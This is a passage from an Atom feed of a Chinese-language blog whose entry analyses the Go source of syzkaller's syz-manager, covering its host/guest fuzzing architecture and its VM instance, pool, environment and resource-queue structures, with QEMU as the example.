<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2023-03-01T20:40:20.334Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【FUZZ.0x02】syzkaller - II：syz-manager源码分析</title>
    <link href="http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T20:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.334Z</updated>
    
    <content type="html"><![CDATA[<p>宁就是👴の Manager 🐎</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>syzkaller 是一个非常经典的 kernel fuzzer，虽然笔者之前曾经用过（不过笔者太菜了啥都没挖出来）也曾粗略读过源码，但是没有太过于仔细分析就抛在脑后了（悲）</p><p>为了深入学习 fuzzing theory，笔者决定先从这个典中典的 syzkaller 源码进行分析学习 ：）</p><h2 id="PRE-工作原理">PRE.工作原理</h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller 整体上为一个<strong>双机调试结构</strong>：由一台机器负责管控整个 fuzzing 流程（本文称为 <code>Host</code>），在另一台机器上进行 fuzzing（本文称为 <code>Guest</code>），Guest 通常为虚拟机，从而能让 Host 更好地管控整个流程</p><p>syzkaller 分为三大组件：</p><ul><li><p>位于 Host：</p><ul><li><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></li></ul></li><li><p>位于 Guest：</p><ul><li><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：<ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</li></ul></li></ul><p><code>syz-manager</code> 为 syzkaller 的控制中枢，其会启动多个 VM 实例并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code>，我们通常启动 fuzzing 时便是以 <code>syz-manager</code> 作为程序启动的入口点，因此笔者也先从此处开始分析</p><h1>0x01. 基本结构体</h1><p>相比于直接开始分析源码，笔者认为有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="VM-管控相关">VM 管控相关</h2><p>Host 需要去感知与管控 Guest VMs，因而在 <code>syz-manager</code> 当中有着一套相应的表示与管理 Guest VM 的结构体</p><h3 id="1-Instance：VM-实例">1. Instance：VM 实例</h3><p><code>syz-manager</code> 中的 VM 实际上是使用一个名为 <code>Instance</code> 的结构体来表示的，定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>类似地，其需要实现 <code>Interface</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance 表示一个单独的 VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy 复制一个 hostSrc 文件到 VM 中并返回 VM 中的文件名.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward 设置从虚拟机内到主机上给定 tcp 端口的转发，</span><br><span class="hljs-comment">// 并返回要在虚拟机中使用的地址.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run 在虚拟机内执行命令 (类似 ssh cmd).</span><br><span class="hljs-comment">// outc 接受混合了命令行与内核控制台的输出.</span><br><span class="hljs-comment">// errc 接受命令等待返回 error 或 vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command 在 timeout 后停止. 在 stop chan 上发送可以用以更早将其终止.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose 从 VM 上检索额外的调试信息</span><br><span class="hljs-comment">// (例如通过发送一些 sys-rq&#x27;s 或 SIGABORT&#x27;ing 一个 Go 程序).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 选择性地直接返回 (一些或所有) 信息. 若 wait == true,</span><br><span class="hljs-comment">// 调用者必须等待 VM 直接输出信息到其日志.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep 描述了 Diagnose 被调用的原因.</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close 停止并销毁 VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名.</li><li><code>Forward()</code>：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址</li><li><code>Run()</code>：在虚拟机内执行命令</li><li><code>Diagnose()</code>：在虚拟机上检索额外的调试信息</li><li><code>Close()</code>：停止并销毁虚拟机</li></ul><p>需要注意的是<strong>不同类型的 Guest VM 所实现的 Interface 接口是不同的</strong></p><blockquote><p>以 QEMU 为例，其实现主要位于 <code>vm/qemu/qemu.go</code> 中</p></blockquote><h3 id="2-Pool：VM-池">2.Pool：VM 池</h3><p>类似于线程池的概念，在 <code>syz-manager</code> 中使用一个 <strong>VM 池</strong> —— <code>Pool</code> 结构体来管控 Guest VM，该结构体定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该结构体实现了 <code>Pool</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool 表示了一组特定类型的测试机器 (虚拟机, 物理设备, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count 返回池中所有 VM 的数量.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create 创建并启动一个新的 VM 实例.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>：返回池中所有 VM 的数量</li><li><code>Create()</code>：<strong>新建并启动一个 VM实例</strong>，返回新建的实例对象</li></ul><h4 id="QEMU-VM-浅析">QEMU VM 浅析</h4><p>以 QEMU 为例的 Pool 接口实现如下，对于 <code>Count()</code> 而言会直接返回配置文件中的计数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> 则会首先检查文件系统镜像是否为 <code>9p</code> 格式，若是则会生成一个 ssh key 存放到 <code>key</code> 文件中并生成一个 <code>init.sh</code> 文件；接下来就是调用 <code>ctor()</code> 函数创建虚拟机：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> 的实现比较简单，主要就是创建一个带着 ssh key 及一些配置信息与一个 channel 的 <code>instance</code> 实例，初始化实例内的管道并调用 <code>boot()</code> 函数进行正式的创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> 函数主要就是各种参数判断，之后<strong>把 QEMU 起了以后 ssh 连上去</strong>，这里就不摘抄代码了：）</p><h3 id="3-Env：单个-VM-Pool-的环境变量">3. Env：单个  VM Pool 的环境变量</h3><p><code>Env</code> 结构体为用于一个 VM Pool 的环境变量，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env 包含了用于 VM 池的全局常量参数.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// 独特的名字</span><br><span class="hljs-comment">// 若几个 Pool 共享了全局命名空间则可被用于 VM name 的冲突解决</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-序列化的 VM-类型-特定配置</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Type：VM-类型">4. Type：VM 类型</h3><p>一个 VM Pool 中只能有一种类型的 VM，因而不同类型的 VM 的 Pool 应当要有不同的构造函数，在 <code>syz-manager</code> 中使用 <code>Type</code> 结构体表示一种 VM 的类型信息，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> 为构造函数类型，其接受一个 <code>Env</code> 类型的结构体指针（储存了全局的一些基本信息），并返回一个 VM Pool 实例</p><p>由一个全局的 <code>string→Type</code> 映射表存储了不同类型 VM 的信息，在正式启动之前程序会通过 <code>Register()</code> 函数将不同类型的 VM 信息注册到该表中，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register 在包中注册一个新的 VM 类型.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>以 <code>QEMU</code> 为例，其在包被导入时注册构造函数，主要是调用 <code>LoadData()</code> 解析配置文件后进行检查，这里不再赘叙：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePool：VM-资源池队列">5. ResourcePool：VM 资源池队列</h3><p>Guest VM 的资源调配主要是通过<code>ResourcePool</code> 这一结构来完成的，这实际上是一个 <strong>存放空闲 VM の idx 的单向队列，决定了 VM 的调度顺序</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要定义了这些方法来操纵资源池队列：</p><ul><li><code>Put()</code> ：向队列末尾添加空闲 VM の idx</li><li><code>Len()</code> ：获取队列长度</li><li><code>Take()</code>：从队列首部取出 <code>cnt</code> 个成员</li><li><code>TakeOne()</code> ：从队列首部取出单个成员</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 